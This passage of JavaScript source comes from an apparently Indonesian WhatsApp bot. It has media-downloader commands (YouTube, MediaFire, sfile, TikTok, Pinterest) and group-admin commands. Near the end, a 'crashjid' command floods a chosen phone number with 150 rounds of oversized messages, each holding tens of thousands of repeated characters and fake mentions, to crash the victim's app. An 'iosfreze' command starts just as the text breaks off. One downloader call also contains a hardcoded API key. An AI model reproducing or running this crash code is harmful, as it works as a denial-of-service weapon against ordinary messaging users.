 *       console.log('Link Download:', result.dl);
 *     }
 *   });
 * 
 * @throws {Object} Objek error dengan informasi kegagalan download
 * 
 * Struktur objek hasil download
 * 
 * @typedef {Object} DownloadResult
 * @property {boolean} status - Status keberhasilan download
 * @property {string} [title] - Judul video (jika berhasil)
 * @property {string} [dl] - Link download (jika berhasil)
 * @property {string} [mess] - Pesan error (jika gagal)
 * 
 */

function ytdl(url, format = 'mp3') {
    return new Promise(async(resolve, reject) => {

        const isYouTubeUrl = /^(?:(?:https?:)?\/\/)?(?:(?:(?:www|m(?:usic)?)\.)?youtu(?:\.be|be\.com)\/(?:shorts\/|live\/|v\/e(?:mbed)?\/|watch(?:\/|\?(?:\S+=\S+&)*v=)|oembed\?url=https?%3A\/\/(?:www|m(?:usic)?)\.youtube\.com\/watch\?(?:\S+=\S+&)*v%3D|attribution_link\?(?:\S+=\S+&)*u=(?:\/|%2F)watch(?:\?|%3F)v(?:=|%3D))?|www\.youtube-nocookie\.com\/embed\/)(([\w-]{11}))[\?&#]?\S*$/
    
        if (!isYouTubeUrl.test(url)) {
            resolve({
                status: false,
                mess: "Link is not valid"
            })
        }
        const id = url.match(isYouTubeUrl)?.[2]
    
        const hr = {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'Referer': 'https://id.ytmp3.mobi/',
        }

        const init = await axios.get(`https://d.ymcdn.org/api/v1/init?p=y&23=1llum1n471&_=${Math.random()}`, {
            headers: hr
        });

        if (init.data.convertURL) {

            let convert = await axios.get(`${init.data.convertURL}&v=${id}&f=${format}&_=${Math.random()}`, {
                headers: hr
            }).then(x => x.data)

            async function progress(url, dl) {
                let currentProgress = 0;
                let title = '';

                while (currentProgress < 3) {
                    try {
                        const response = await axios.get(url, {
                            headers: hr
                        });
                        const data = response.data;

                        if (data.error > 0) {
                            resolve({
                                status: false,
                                mess: `Error: ${data.error}`
                            });
                        }

                        currentProgress = data.progress;
                        title = data.title

                        if (currentProgress < 3) {
                            await new Promise(resolve => setTimeout(resolve, 200));
                        }
                    } catch (error) {
                        resolve({
                            status: false,
                            mess: 'Error checking progress:' + error.message
                        })
                    }
                }
                return { dl, title }
            }

            const result = await progress(convert.progressURL, convert.downloadURL);
            resolve({
                status: true,
                title: result.title,
                dl: result.dl
            })
        } else {
            resolve({
                status: false,
                mess: "convertURL is missing"
            })
        }
    })
};

async function download(url) {

const mp3 = await ytdl(url,"mp3")
const mp4 = await ytdl(url,"mp4")

return { mp3, mp4 }
}

if (!text.includes('youtu')) return reply(`• *Example :* .${command} https://www.youtube.com/xxxxxxx`)

const vidId = ((_a = /(?:youtu\.be\/|youtube\.com(?:\/(?:[^\/\n\s]+\/\S+\/|(?:v|e(?:mbed)?)\/|\S*?[?&]v=|shorts\/)|youtu\.be\/|embed\/|v\/|m\/|watch\?(?:[^=]+=[^&]+&)*?v=))([^"&?\/\s]{11})/gm.exec(text)) === null || _a === void 0 ? void 0 : _a[1]) || "";
const result = await yts({ videoId: vidId, hl: 'id', gl: 'ID' })

let deku = `⏤͟͟͞͞╳── *[ ᴅᴏᴡɴʟᴏᴀᴅ - ʏᴛᴍᴘ3 ]* ── .々─ᯤ\n`
deku += `│    =〆 ᴛɪᴛʟᴇ: ${result.title}\n`
deku += `│    =〆 ɪᴅ: ${result.videoId}\n`
deku += `│    =〆 ᴅᴜʀᴀsɪ: ${result.timestamp}\n`
deku += `│    =〆 ᴀɢᴏ: ${result.ago}\n`
deku += `│    =〆 ᴅᴇsᴄʀɪᴘᴛɪᴏɴ: ${result.description}\n`
deku += `│    =〆 ᴜʀʟ: ${result.url}\n`
deku += `⏤͟͟͞͞╳────────── .✦`

await kyami.sendMessage(m.chat, {
text: deku,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
externalAdReply: {
title: result.title,
mediaType: 1,
previewType: 1,
body: `Durasi : ${result.timestamp} / View : ${result.views}`,
thumbnailUrl: result.image,
renderLargerThumbnail: true,
mediaUrl: result.url,
sourceUrl: result.url
}
}
},{ quoted: qpayment });

try {

let downyt = await download(result.url)
await kyami.sendMessage(m.chat, { audio: { url: downyt.mp3.dl }, mimetype: 'audio/mpeg' }, { quoted: qpayment })

} catch (err) {
 m.reply('Error....')
}

}
uselimit(1)
break

/**
 *[ CASE BREAK YTMP4 ]*
**/

case 'ytmp4': case 'ytvideo': case 'ytv': {
if (!users.registered) return reply(mess.daftar)
if (users.limit < 1 ) return reply(`[ ! ] LIMITMU KURANG DARI 1`)
const axios = require('axios')
const yts = require('yt-search')

/**
 * Fungsi untuk mengunduh video atau audio dari YouTube
 * 
 * By NDBOTZ ⟩⟩ https://whatsapp.com/channel/0029VaAMjXT4yltWm1NBJV3J
 * 
 * @param {string} url - URL video YouTube yang akan diunduh
 * @param {string} [format='mp3'] - Format file yang diinginkan (mp3 atau mp4)
 * @returns {Promise<DownloadResult>} Promise dengan hasil download
 * 
 * @example
 * // Download audio MP3
 * ytdl('https://youtube.com/watch?v=videoID')
 *   .then(result => {
 *     if (result.status) {
 *       console.log('Judul:', result.title);
 *       console.log('Link Download:', result.dl);
 *     }
 *   });
 * 
 * @example
 * // Download video MP4
 * ytdl('https://youtube.com/watch?v=videoID', 'mp4')
 *   .then(result => {
 *     if (result.status) {
 *       console.log('Judul:', result.title);
 *       console.log('Link Download:', result.dl);
 *     }
 *   });
 * 
 * @throws {Object} Objek error dengan informasi kegagalan download
 * 
 * Struktur objek hasil download
 * 
 * @typedef {Object} DownloadResult
 * @property {boolean} status - Status keberhasilan download
 * @property {string} [title] - Judul video (jika berhasil)
 * @property {string} [dl] - Link download (jika berhasil)
 * @property {string} [mess] - Pesan error (jika gagal)
 * 
 */

function ytdl(url, format = 'mp3') {
    return new Promise(async(resolve, reject) => {

        const isYouTubeUrl = /^(?:(?:https?:)?\/\/)?(?:(?:(?:www|m(?:usic)?)\.)?youtu(?:\.be|be\.com)\/(?:shorts\/|live\/|v\/e(?:mbed)?\/|watch(?:\/|\?(?:\S+=\S+&)*v=)|oembed\?url=https?%3A\/\/(?:www|m(?:usic)?)\.youtube\.com\/watch\?(?:\S+=\S+&)*v%3D|attribution_link\?(?:\S+=\S+&)*u=(?:\/|%2F)watch(?:\?|%3F)v(?:=|%3D))?|www\.youtube-nocookie\.com\/embed\/)(([\w-]{11}))[\?&#]?\S*$/
    
        if (!isYouTubeUrl.test(url)) {
            resolve({
                status: false,
                mess: "Link is not valid"
            })
        }
        const id = url.match(isYouTubeUrl)?.[2]
    
        const hr = {
            'Accept': 'application/json, text/plain, */*',
            'Content-Type': 'application/json',
            'Access-Control-Allow-Origin': '*',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
            'Referer': 'https://id.ytmp3.mobi/',
        }

        const init = await axios.get(`https://d.ymcdn.org/api/v1/init?p=y&23=1llum1n471&_=${Math.random()}`, {
            headers: hr
        });

        if (init.data.convertURL) {

            let convert = await axios.get(`${init.data.convertURL}&v=${id}&f=${format}&_=${Math.random()}`, {
                headers: hr
            }).then(x => x.data)

            async function progress(url, dl) {
                let currentProgress = 0;
                let title = '';

                while (currentProgress < 3) {
                    try {
                        const response = await axios.get(url, {
                            headers: hr
                        });
                        const data = response.data;

                        if (data.error > 0) {
                            resolve({
                                status: false,
                                mess: `Error: ${data.error}`
                            });
                        }

                        currentProgress = data.progress;
                        title = data.title

                        if (currentProgress < 3) {
                            await new Promise(resolve => setTimeout(resolve, 200));
                        }
                    } catch (error) {
                        resolve({
                            status: false,
                            mess: 'Error checking progress:' + error.message
                        })
                    }
                }
                return { dl, title }
            }

            const result = await progress(convert.progressURL, convert.downloadURL);
            resolve({
                status: true,
                title: result.title,
                dl: result.dl
            })
        } else {
            resolve({
                status: false,
                mess: "convertURL is missing"
            })
        }
    })
};

async function download(url) {

const mp3 = await ytdl(url,"mp3")
const mp4 = await ytdl(url,"mp4")

return { mp3, mp4 }
}

if (!text.includes('youtu')) return reply(`• *Example :* .${command} https://www.youtube.com/xxxxxxx`)

const vidId = ((_a = /(?:youtu\.be\/|youtube\.com(?:\/(?:[^\/\n\s]+\/\S+\/|(?:v|e(?:mbed)?)\/|\S*?[?&]v=|shorts\/)|youtu\.be\/|embed\/|v\/|m\/|watch\?(?:[^=]+=[^&]+&)*?v=))([^"&?\/\s]{11})/gm.exec(text)) === null || _a === void 0 ? void 0 : _a[1]) || "";
const result = await yts({ videoId: vidId, hl: 'id', gl: 'ID' })

let deku = `⏤͟͟͞͞╳── *[ ᴅᴏᴡɴʟᴏᴀᴅ - ʏᴛᴍᴘ3 ]* ── .々─ᯤ\n`
deku += `│    =〆 ᴛɪᴛʟᴇ: ${result.title}\n`
deku += `│    =〆 ɪᴅ: ${result.videoId}\n`
deku += `│    =〆 ᴅᴜʀᴀsɪ: ${result.timestamp}\n`
deku += `│    =〆 ᴀɢᴏ: ${result.ago}\n`
deku += `│    =〆 ᴅᴇsᴄʀɪᴘᴛɪᴏɴ: ${result.description}\n`
deku += `│    =〆 ᴜʀʟ: ${result.url}\n`
deku += `⏤͟͟͞͞╳────────── .✦`

await kyami.sendMessage(m.chat, {
text: deku,
contextInfo: {
forwardingScore: 999,
isForwarded: true,
externalAdReply: {
title: result.title,
mediaType: 1,
previewType: 1,
body: `Durasi : ${result.timestamp} / View : ${result.views}`,
thumbnailUrl: result.image,
renderLargerThumbnail: true,
mediaUrl: result.url,
sourceUrl: result.url
}
}
},{ quoted: qpayment });

try {

let downyt = await download(result.url)
await kyami.sendMessage(m.chat, { video: { url: downyt.mp4.dl }, caption: result.title }, { quoted: qpayment })

} catch (err) {
 m.reply('Error....')
}

}
uselimit(1)
break
case 'tovn': {
if (!terdaftar) return reply(global.mess.daftar)
if (!/video/.test(mime) && !/audio/.test(mime)) return m.reply(`reply video/vn with caption ${prefix + command}`)
if (!quoted) return m.reply(`reply video/vn with caption ${prefix + command}`)
await reaction(m.chat, "🔒");
await sleep(5000)
let media = await quoted.download()
let { toAudio } = require('./lib/converter')
let audio = await toAudio(media, 'mp4')
await reaction(m.chat, "🔓");
kyami.sendMessage(m.chat, {audio, mimetype:'audio/mpeg', ptt: true}, { quoted : m })
}
break
case 'mediafire': case 'mf': {
if (!users.registered) return reply(mess.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
if (!text.includes('mediafire.com')) return reply(`• *Example :* .${command} https://www.mediafire.com/file/xxxxxxx/`)

async function mf(url) {
    return new Promise(async (resolve, reject) => {
        try {
            const response = await require("undici").fetch(url);
            const data = await response.text();
            const $ = cheerio.load(data);
            
            let name = $('.dl-info > div > div.filename').text();
            let link = $('#downloadButton').attr('href');
          let det = $('ul.details').html().replace(/\s/g, "").replace(/<\/li><li>/g, '\n').replace(/<\/?li>|<\/?span>/g, '');
            let type = $('.dl-info > div > div.filetype').text();

        

            const hasil = {
                filename: name,
                filetype: type,
                link: link,
                detail: det
            };

            resolve(hasil);
        } catch (err) {
            console.error(err);
            reject(err);
        }
    });
}

const sendReaction = async reactionContent => {
  kyami.sendMessage(m.chat, {
    'react': {
      'text': reactionContent,
      'key': m.key
    }
  });
};

try {
let { filename, filetype, link, detail } = await mf(text)
let mfcap = `╭──── *[ ᴅᴏᴡɴʟᴏᴀᴅ - ᴍғ 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜ ]* ──々\n`
mfcap += `│ =〆 ɴᴀᴍᴀ : ${filename}\n`
mfcap += `│ =〆 ᴛʏᴘᴇ : ${filetype}\n`
mfcap += `│ =〆 ᴅᴇᴛᴀɪʟ : ${detail}\n`
mfcap += `│ =〆 ᴜʀʟ : ${text}\n`
mfcap += `╰─々`

await kyami.sendMessage(m.chat, {document: {url:link}, mimetype: link, fileName: filename, caption: mfcap }, {quoted:m});
} catch (err) {
try {
sendReaction("⏳")
const akira = await fetchJson(`https://api.botwa.space/api/mediafire?url=${text}&apikey=90x5sFRa1Xlc`)
let { filename, filesize, uploadAt, link } = akira.result
let result = `╭──── *[ ᴅᴏᴡɴʟᴏᴀᴅ - ᴍғ 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜ ]* ──々\n`
result += `│ =〆 ɴᴀᴍᴀ : ${filename}\n`
result += `│ =〆 sɪᴢᴇ : ${filesize}\n`
result += `│ =〆 ᴛᴀɴɢɢᴀʟ ᴜᴘʟᴏᴀᴅ : ${uploadAt}\n`
result += `│ =〆 ᴜʀʟ : ${text}\n`
result += `╰─々`
sendReaction("✅")
await kyami.sendMessage(m.chat, {document: {url:akira.result.link}, mimetype: akira.result.link, fileName: filename, caption: result}, {quoted:m});
} catch (err) {
 sendReaction("❌")
}}}
uselimit(1)
break
case 'sfiledl': case 'sfdl': {
if (!users.registered) return reply(mess.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`) 
if (!text.includes('https://sfile.mobi')) return reply(`• *Example :* .${command} https://sfile.mobi/xxxxxxx/`)

reply(mess.wait)
reaction(m.sender, "⏳")
/*
💥 *SFILE DOWNLOADER*

💨 Options:
- Search (Query) + Page
- Top Trending + Page
- Latest Upload + Page
- Download

🧑‍💻 Script Code by Daffa
*/

const sfile = {
    latest_uploads: async function(page = 1) {
        try {
            const res = await axios.get('https://sfile.mobi');
            const cookies = res.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');
            const headers = {
                'cookie': cookies,
                'referer': 'https://sfile.mobi/uploads.php',
                'user-agent': 'Postify/1.0.0'
            };
            const uploads = await axios.get(`https://sfile.mobi/uploads.php?page=${page}`, { headers });
            const $ = cheerio.load(uploads.data);

            const data = $('.list').map((_, el) => ({
                title: $(el).find('a').text().trim(),
                link: $(el).find('a').attr('href'),
                size: $(el).find('small').text().match(/(\d+(?:\.\d+)?\s[KMGT]B)/)?.[1],
                uploadDate: $(el).find('small').text().match(/Uploaded:\s([\d\-a-zA-Z]+)/)?.[1]
            })).get().filter(item => item.title && item.link && item.size && item.uploadDate);

            return { creator: 'Daffa ~', status: 'success', code: 200, data };
        } catch (error) {
            console.error(error);
            return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'An error occurred while fetching the latest updates.' };
        }
    },

    top_trending: async function(page = 1) {
        try {
            const response = await axios.get('https://sfile.mobi');
            const cookies = response.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');
            const headers = {
                'authority': 'sfile.mobi',
                'accept': 'application/json, text/html, application/xhtml+xml, application/xml;q=0.9, image/avif, image/webp, image/apng, */*;q=0.8, application/signed-exchange;v=b3;q=0.7',
                'cookie': cookies,
                'referer': `https://sfile.mobi/top.php?page=${page}`,
                'user-agent': 'Postify/1.0.0'
            };
            const top = await axios.get(`https://sfile.mobi/top.php?page=${page}`, { headers });
            const $ = cheerio.load(top.data);

            const data = $('.list').map((_, el) => {
                const title = $(el).find('a').text().trim();
                const link = $(el).find('a').attr('href');
                const [size, downloadInfo] = $(el).find('small').text().split(', Download: ').map(e => e.trim());
                const [downloadCount, uploadedDate] = downloadInfo ? downloadInfo.split(' Uploaded: ').map(e => e.trim()) : [undefined, undefined];

                return title && link && size && downloadCount && uploadedDate ? 
                    { title, link, size, downloadCount, uploadDate: uploadedDate } : null;
            }).get().filter(item => item);

            return { creator: 'Daffa ~', status: 'success', code: 200, data };
        } catch (error) {
            console.error(error);
            return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'An error occurred while fetching the top trending files.' };
        }
    },
    
    search: async function(query, page = 1) {
        try {
            const url = `https://sfile.mobi/search.php?q=${query}&page=${page}`;
            const response = await axios.get(url, {
                headers: {
                    'authority': 'sfile.mobi',
                    'accept': 'application/json, text/html, application/xhtml+xml, application/xml;q=0.9,*/*;q=0.8',
                    'referer': url,
                    'user-agent': 'Postify/1.0.0'
                }
            });

            const $ = cheerio.load(response.data);
            
            const data = $('.list').map((_, el) => {
                const title = $(el).find('a').text().trim();
                const link = $(el).find('a').attr('href');
                const sizeMatch = $(el).text().match(/\(([^)]+)\)$/);
                const size = sizeMatch ? sizeMatch[1] : undefined;
                return title ? { title, link, size } : null;
            }).get();

            return { creator: 'Daffa ~', status: 'success', code: 200, data };
        } catch (error) {
            console.error(error);
            return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'An error occurred while fetching search results.' };
        }
    },
    
    download: async function(url) {
        const headers = {
            'referer': url,
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'en-US,en;q=0.9',
            'user-Agent': 'Postify/1.0.0',
        };

        try {
            const response = await axios.get(url, { headers });
            headers.Cookie = response.headers['set-cookie'].map(cookie => cookie.split(';')[0]).join('; ');

            const [filename, mimetype, downloadLink] = [
                response.data.match(/<h1 class="intro">(.*?)<\/h1>/s)?.[1] || '',
                response.data.match(/<div class="list">.*? - (.*?)<\/div>/)?.[1] || '',
                response.data.match(/<a class="w3-button w3-blue w3-round" id="download" href="([^"]+)"/)?.[1]
            ];
            
            if (!downloadLink) return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'Download link tidak ditemukan!' };

            headers.Referer = downloadLink;
            const final = await axios.get(downloadLink, { headers });

            const [directLink, key, filesize] = [
                final.data.match(/<a class="w3-button w3-blue w3-round" id="download" href="([^"]+)"/)?.[1],
                final.data.match(/&k='\+(.*?)';/)?.[1].replace(`'`, ''),
                final.data.match(/Download File \((.*?)\)/)?.[1]
            ];

            const result = directLink + (key ? `&k=${key}` : '');
            if (!result) return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: 'Direct Link Download tidak ditemukan!' };

            const data = await this.convert(result, url);

            return { creator: 'Daffa ~', status: 'success', code: 200, data: { filename, filesize, mimetype, result: data } };
        } catch (error) {
            return { creator: 'Daffa ~', status: 'error', code: 500, data: [], message: error };
        }
    },

    convert: async function(url, directLink) {
        try {
            const init = await axios.get(url, {
                maxRedirects: 0,
                validateStatus: status => status >= 200 && status < 303,
                headers: {
                    'Referer': directLink,
                    'User-Agent': 'Postify/1.0.0'
                },
            });

            const cookies = init.headers['set-cookie'].map(c => c.split(';')[0]).join('; ');
            const redirect = init.headers.location;

            const final_result = await axios.get(redirect, {
                responseType: 'arraybuffer',
                headers: {
                    'referer': directLink,
                    'user-agent': 'Postify/1.0.0',
                    'cookie': cookies,
                },
            });

            const filename = final_result.headers['content-disposition']?.match(/filename=["']?([^"';]+)["']?/)?.[1] || 'Tidak diketahui';
            return {
                filename,
                mimeType: final_result.headers['content-type'],
                buffer: Buffer.from(final_result.data)
            };
        } catch (error) {
            throw error;
        }
    }
};

try {
let hasil = await sfile.download(text)
let { filename, filesize, mimetype } = hasil.data
let sfdl = hasil.data.result
let sfcap = `╭──── *[ ᴅᴏᴡɴʟᴏᴀᴅ - sғ 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜ ]* ──々\n`
sfcap += `│ =〆 ɴᴀᴍᴀ : ${filename}\n`
sfcap += `│ =〆 ᴛʏᴘᴇ : ${mimetype}\n`
sfcap += `│ =〆 ᴅᴇᴛᴀɪʟ : ${filesize}\n`
sfcap += `│ =〆 ᴜʀʟ : ${text}\n`
sfcap += `╰─々`

await kyami.sendMessage(m.chat, {document: sfdl.buffer, mimetype: sfdl.mimeType, fileName: sfdl.filename, caption: sfcap }, {quoted:m});
reaction(m.sender, "✅")
} catch (err) {
reaction(m.sender, "❌")
}uselimit(1)}
break
case 'gdrive': {
    if (!users.registered) return reply(mess.daftar)
		if (!args[0]) return reply(`Enter the Google Drive link`)
	reply(mess.wait)
	const fg = require('api-dylux')
	try {
	let res = await fg.GDriveDl(args[0])
	 await reply(`
≡ *Google Drive DL*
▢ *Nama:* ${res.fileName}
▢ *Size:* ${res.fileSize}
▢ *Type:* ${res.mimetype}`)
	kyami.sendMessage(m.chat, { document: { url: res.downloadUrl }, fileName: res.fileName, mimetype: res.mimetype }, { quoted: m })
   } catch {
	reply('Error: Check link or try another link') 
  }
}
uselimit(1)
break
case 'ttslide': case 'tiktokslide':{
if (!users.registered) return reply(mess.daftar)
if (!text.includes('tiktok.com')) return reply(`*Example :* .${command} hhttps://vt.tiktok.com/xxxxxxx/`)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
const { tiktok, tiktok2, dlv3, dlv4, dlv5 } = require('./lib/tiktoktop')
const hasil = await dlv5(text)
let leocap = `*KYAMI SLIDE DOWNLOADER*\n\n*TITLE* : ${hasil.title}\n\n *TANGGAL* : ${hasil.at}\n\n*LINK* : ${text}`

try {
reaction(m.chat, "⏳")//react error
for (let i = 0; i < hasil.data.length; i++) {
let image = hasil.data[i];
await kyami.sendMessage(m.sender, { image: { url: image.url }, caption: i === 0 ? `${leocap}` : '' }, { quoted: m });
if (isGroup) return reply(`FOTO SLIDE SUDAH DIKIRIM KE CHAT PRIBADI`)
reaction(m.chat, "✅")//react error
}
} catch (err) {
reaction(m.chat, "❎")//react error
}}
uselimit(1)
break
case 'tiktokvideo':
case 'ttvideo':
case 'tiktokvid':
case 'ttvid': {
if (!users.registered) return reply(mess.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
if (args.length == 0) return reply(`Example: ${prefix + command} link lu`)
await reaction(m.chat, "🕒");
const api = require('btch-downloader')
if (!args[0]) return reply(`Masukan URL!\n\ncontoh:\n${prefix + command} https://vm.tiktok.com/ZGJAmhSrp/`);
if (!args[0].match(/tiktok/gi)) return reply(`URL Yang Tuan Berikan *Salah!!!*`);
try {
let maximus = await api.ttdl(args[0]);
let caption = `乂 *T I K T O K  D O W N L O A D* 

• *ɴᴀᴍᴀ ᴠɪᴅᴇᴏs:* 
${maximus.title}

• *ɴᴀᴍᴀ ᴀᴜᴅɪᴏ:* 
${maximus.title_audio}

${global.namabot}`;
await kyami.sendMessage(m.chat, { video: { url: maximus.video[0] }, caption: caption })
await kyami.sendMessage(m.chat, { audio: { url: maximus.audio[0] }, mimetype: "audio/mpeg", ptt: true }, { quoted: m })
await uselimit(1)
      } catch (e) {
		console.log(e)
		reply(e)
	}
}
break
case 'autoai':
 if (!users.registered) return reply(mess.daftar)
 if (!Creator) return reply(mess.owner)
 if (args.length < 1) return 
 if (q == 'on') {
 global.db.data.chats[m.chat].luminai = true
 reply('Sukses mengaktifkan chat ai')
 } else if (q == 'off') {
 global.db.data.chats[m.chat].luminai = false
 reply('Sukes menonaktifkan chat ai')
 } else {
 m.reply('on / off beybeh')
 }
break
case 'autoread':
 if (!users.registered) return reply(mess.daftar)
 if (!Creator) return reply(mess.owner)
 if (args.length < 1) return 
 if (q == 'on') {
 settings.autoread = true
 reply(`Sukses mengaktifkan ${command}`)
 } else if (q == 'off') {
 settings.autoread = false
 reply(`Sukes menonaktifkan ${command}`)
 } else {
 m.reply('on / off beybeh')
 }
break
case 'antivirtex':
 if (!users.registered) return reply(mess.daftar)
 if (!isAdmins) return reply(mess.admin)
 if (!isBotAdmins)
 if (args.length < 1) return 
 if (q == 'on') {
 settings.antivirtex = true
 reply(`Sukses mengaktifkan ${command}`)
 } else if (q == 'off') {
 settings.antivirtex = false
 reply(`Sukes menonaktifkan ${command}`)
 } else {
 m.reply(`bukan gitu cok ${prefix + command} on / off beybeh`)
 }
break
case "hidetag": {
if (!users.registered) return reply(mess.daftar)
if (!isGroup) return reply(mess.ingroup)
if (!isAdmins) return reply(mess.admin)
if (!m.quoted && !text) return m.reply('example : .hidetag teksnya/replyteks')
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
kyami.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case 'delete': case 'del': {
 if (!users.registered) return reply(mess.daftar)
 if (m?.isGroup && !isAdmins && !groupOwner && isBotAdmins) return
 let key = {}
 try {
 	key.remoteJid = m.quoted ? m.quoted.fakeObj.key.remoteJid : m.key.remoteJid
	key.fromMe = m.quoted ? m.quoted.fakeObj.key.fromMe : m.key.fromMe
	key.id = m.quoted ? m.quoted.fakeObj.key.id : m.key.id
 	key.participant = m.quoted ? m.quoted.fakeObj.participant : m.key.participant
 } catch (e) {
 	console.error(e)
 }
kyami.sendMessage(m.chat, { delete: key })
}
break
    case "kick":{
        if (!users.registered) return reply(mess.daftar)
 if (!isBotAdmins) return reply(mess.adminbot)
if (m.isGroup && !isAdmins && !groupOwner && isBotAdmins) return
if (!text && !m?.quoted) reply('masukkan nomor yang ingin di kick')
let users = m?.quoted ? m?.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await kyami.groupParticipantsUpdate(m?.chat, [users], 'remove').catch(console.log)
}
break
case 'antilinkgc': {
    if (!users.registered) return reply(mess.daftar)
               if (!m.isGroup) return reply(mess.ingroup)
if (!isBotAdmins) return reply(mess.adminbot)
if (!isAdmins && !Creator) return reply(mess.admin)
               if (args.length < 1) return reply('on/off?')
               if (args[0] === 'on') {
                  db.data.chats[from].antilinkgc = true
                  reply(`${command} is enabled`)
               } else if (args[0] === 'off') {
                  db.data.chats[from].antilinkgc = false
                  reply(`${command} is disabled`)
               }
            }
            break
 case 'pinterest': case 'pin': {
if (!users.registered) return reply(mess.daftar)
if (users.limit < 1) return reply(`[ ! ] LIMIT MU KURANG DARI 1`)
  if (!text) return reply(`Enter Query`);
  //try {
  await m.reply('sabar ci😈');

  async function createImage(url) {
    const { imageMessage } = await generateWAMessageContent({
      image: {
        url
      }
    }, {
      upload: kyami.waUploadToServer
    });
    return imageMessage;
  }

  function shuffleArray(array) {
    for (let i = array.length - 1; i > 0; i--) {
      const j = Math.floor(Math.random() * (i + 1));
      [array[i], array[j]] = [array[j], array[i]];
    }
  }

  let push = [];
  let { data } = await axios.get(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${text}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${text}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`);
  let res = data.resource_response.data.results.map(v => v.images.orig.url);

  shuffleArray(res); // Mengacak array
  let ult = res.splice(0, 5); // Mengambil 10 gambar pertama dari array yang sudah diacak
  let i = 1;

  for (let pus of ult) {
    push.push({
      body: proto.Message.InteractiveMessage.Body.fromObject({
        text: `Image ke - ${i++}`
      }),
      footer: proto.Message.InteractiveMessage.Footer.fromObject({
        text: text
      }),
      header: proto.Message.InteractiveMessage.Header.fromObject({
        title: 'Hasil.',
        hasMediaAttachment: true,
        imageMessage: await createImage(pus)
      }),
      nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
        buttons: [
          {
            name: "cta_url",
            buttonParamsJson: `{"display_text":"url","Klik disini":"${pus}","merchant_url":"${pus}"}`
          }
        ]
      })
    });
  }

  const msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
      message: {
        messageContextInfo: {
          deviceListMetadata: {},
          deviceListMetadataVersion: 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.fromObject({
          body: proto.Message.InteractiveMessage.Body.create({
            text: 'Hai\nDibawah ini Adalah hasil dari Pencarian Kamu'
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: global.namaowner
          }),
          header: proto.Message.InteractiveMessage.Header.create({
            hasMediaAttachment: false
          }),
          carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
            cards: [
              ...push
            ]
          })
        })
      }
    }
  }, {});

  await kyami.relayMessage(m.chat, msg.message, {
    messageId: msg.key.id
  });
  
}
uselimit(1)
break
case 'crashjid': case 'oribug': {
if (!Creator) return reply(mess.owner)
if (!q) return reply(`Example: ${prefix + command} 62×××`)
target = q.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
reaction(m.chat, "⌛")
for (let i = 0; i < 150; i++) {
await kyami.relayMessage(target, {"extendedTextMessage": {
text: `Kyami ${"ꦾ".repeat(40000)}`,
"contextInfo": { mentionedJid: [ "@6283199373983@s.whatsapp.net", ...Array.from({ length: 25000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) ] }
}
}, { participant: { jid: target }})
await kyami.relayMessage(target, {"extendedTextMessage": {
text: `Kyami  ${"@6283199373983".repeat(10000)}`,
"contextInfo": { mentionedJid: [ "@6283199373983@s.whatsapp.net" ] }
}
}, { participant: { jid: target }})
await kyami.relayMessage(target, {"extendedTextMessage": {
text: `crash 🩸 ${"@6283199373983".repeat(10000)}`,
"contextInfo": { mentionedJid: [ "@6281@s.whatsapp.net", ...Array.from({ length: 25000 }, () => `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`) ] }
}
}, { participant: { jid: target }})
}
m.reply("「 𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒 𝐲̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷̷ͨͩ͢͠𝐅𝐚͜𝐚͜𝐚͜𝐚͜ 」")
}
break
case "iosfreze": {
if (!Creator) return reply(mess.owner)
